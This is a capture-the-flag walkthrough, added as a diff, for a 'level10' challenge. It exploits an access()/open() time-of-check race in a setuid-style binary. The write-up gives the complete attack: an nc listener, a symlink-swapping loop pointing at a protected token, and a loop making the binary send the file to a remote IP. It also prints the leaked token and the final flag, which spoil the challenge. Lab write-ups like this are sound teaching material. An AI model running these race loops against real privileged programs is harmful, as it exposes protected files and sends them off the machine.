@@ -1,0 +1,33 @@
+Here, it will be more complicated. We have 2 files: level10 ans token.
+
+When we try to execute level10, we get this usage:
+./level10 file host
+	sends file to host if you have access to it
+
+Now if we try to execute like this : "./level10 token 192.168.1.65", we get:
+You don't have access to token
+
+So let's see what is inside level10 with "strings level10"
+We can see some interesting lines such as:
+open
+access
+Connecting to %s:6969 ..
+
+If we search on internet, we can see that there is a security hole with access and open, and this is exactly what we gonna do.
+Our goal is to quickly change a Symlink with a file that we can access, and the file that we want, in order to get the access sending true, but the open using the protected file.
+
+First, you need to create a file like /tmp/first
+Then, in order to perform our evil plan, we will need 3 terminals:
+- one will scan the port 6969 with: "nc -k -l 6969"
+- one will create and change the Symlink: "while true; do ln -s /tmp/first /tmp/second; rm -Rf /tmp/second; ln -s ~/token /tmp/second; rm -Rf /tmp/second; done"
+- one will execute the level10 with our Symlink: "while true; do ./level10 /tmp/second 192.168.1.65; done"
+
+On the terminal that is scanning, you can sometimes see the token like this:
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+
+Now you can close other terminals and "su flag10" with this token
+After that you can getflag to get: feulo4b72j7edeahuete3no7c
